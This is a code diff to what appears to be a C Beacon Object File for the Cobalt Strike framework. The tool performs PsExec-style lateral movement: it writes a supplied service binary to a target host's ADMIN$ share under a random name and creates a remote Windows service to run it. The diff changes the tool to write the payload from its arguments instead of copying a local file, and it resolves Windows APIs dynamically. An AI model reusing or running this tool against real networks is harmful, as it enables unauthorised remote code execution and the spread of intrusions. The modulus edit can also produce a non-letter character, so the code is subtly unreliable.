@@ -12,12 +12,15 @@ typedef BOOL(WINAPI *DELETESERVICE)(SC_HANDLE);
 typedef BOOL(WINAPI *CLOSESERVICEHANDLE)(SC_HANDLE);
 typedef DWORD(WINAPI *GETLASTERROR)();
 typedef int(__cdecl *SNPRINTF)(char *, size_t, const char *, ...);
-typedef BOOLEAN (WINAPI* RTLGENRANDOM)(PVOID, ULONG); 
+typedef BOOLEAN(WINAPI *RTLGENRANDOM)(PVOID, ULONG);
+typedef HANDLE(WINAPI *CREATEFILEA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+typedef BOOL(WINAPI *WRITEFILE)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+typedef BOOL(WINAPI *CLOSEHANDLE)(HANDLE hObject);
 
 void generateRandomString(char *buffer, int length)
 {
     // Max length is 256 bytes for now
-    char randomBytes[256];
+    unsigned char randomBytes[256];
 
     // TODO: move to global variables instead
     RTLGENRANDOM pRtlGenRandom = (RTLGENRANDOM)GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction036");
@@ -30,7 +33,7 @@ void generateRandomString(char *buffer, int length)
     // Convert bytes to A-Z
     for (int i = 0; i < length; i++)
     {
-        unsigned char val = randomBytes[i] % 3;
+        unsigned char val = randomBytes[i] % 27;
         buffer[i] = 'A' + val;
     }
     buffer[length] = '\0';
@@ -38,14 +41,16 @@ void generateRandomString(char *buffer, int length)
 
 void go(char *args, int len)
 {
-    char *target, *localPath;
+    char *target;
+    unsigned char *svcBinary;
+    int svcBinarySize;
 
     // Parse arguments
     datap parser;
     BeaconDataParse(&parser, args, len);
 
-    localPath = BeaconDataExtract(&parser, NULL);
     target = BeaconDataExtract(&parser, NULL);
+    svcBinary = BeaconDataExtract(&parser, &svcBinarySize);
 
     // Dynamically resolve APIs
     HMODULE hMpr = LoadLibraryA("mpr.dll");
@@ -62,6 +67,9 @@ void go(char *args, int len)
     CLOSESERVICEHANDLE pCloseServiceHandle = (CLOSESERVICEHANDLE)GetProcAddress(hAdvapi32, "CloseServiceHandle");
     GETLASTERROR pGetLastError = (GETLASTERROR)GetProcAddress(hKernel32, "GetLastError");
     SNPRINTF pSnprintf = (SNPRINTF)GetProcAddress(hMsvcrt, "_snprintf");
+    CREATEFILEA pCreateFileA = (CREATEFILEA)GetProcAddress(hKernel32, "CreateFileA");
+    WRITEFILE pWriteFile = (WRITEFILE)GetProcAddress(hKernel32, "WriteFile");
+    CLOSEHANDLE pCloseHandle = (CLOSEHANDLE)GetProcAddress(hKernel32, "CloseHandle");
 
     if (!pWNetAddConnection2A || !pCopyFileA || !pOpenSCManagerA || !pCreateServiceA || !pGetLastError)
     {
@@ -86,14 +94,26 @@ void go(char *args, int len)
     char binaryName[6];
     generateRandomString(binaryName, 5);
     pSnprintf(remotePath, sizeof(remotePath), "\\\\%s\\ADMIN$\\%s.exe", target, binaryName);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying service binary from %s to %s\n", localPath, remotePath);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Writing service binary to %s\n", remotePath);
 
-    if (!pCopyFileA(localPath, remotePath, FALSE))
-    { // FALSE = overwrite existing
-        // TODO: copyfilea may not work, if path uses non-ASCII letters
-        BeaconPrintf(CALLBACK_ERROR, "[X] CopyFileA failed: %lu\n", pGetLastError());
+    HANDLE hFile = pCreateFileA(remotePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "[X] CreateFileA failed: %lu", pGetLastError());
         return;
     }
+
+
+    DWORD bytesWritten;
+    if (!pWriteFile(hFile, svcBinary, svcBinarySize, &bytesWritten, NULL))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "[X] WriteFile failed: %lu", pGetLastError());
+        pCloseHandle(hFile);
+        return;
+    }
+    pCloseHandle(hFile);
+
+
 
     // 3. Create and start service
     SC_HANDLE hSCM = pOpenSCManagerA(target, NULL, SC_MANAGER_CREATE_SERVICE);
@@ -102,6 +122,7 @@ void go(char *args, int len)
         BeaconPrintf(CALLBACK_ERROR, "[X] OpenSCManagerA failed: %lu", pGetLastError());
         return;
     }
+
 
     char serviceName[9];
     char displayName[13];
@@ -114,7 +135,6 @@ void go(char *args, int len)
         BeaconPrintf(CALLBACK_ERROR, "[X] Name generation failed");
         return;
     }
-
 
     char payloadPath[MAX_PATH];
     pSnprintf(payloadPath, sizeof(payloadPath), "C:\\Windows\\%s.exe", binaryName);
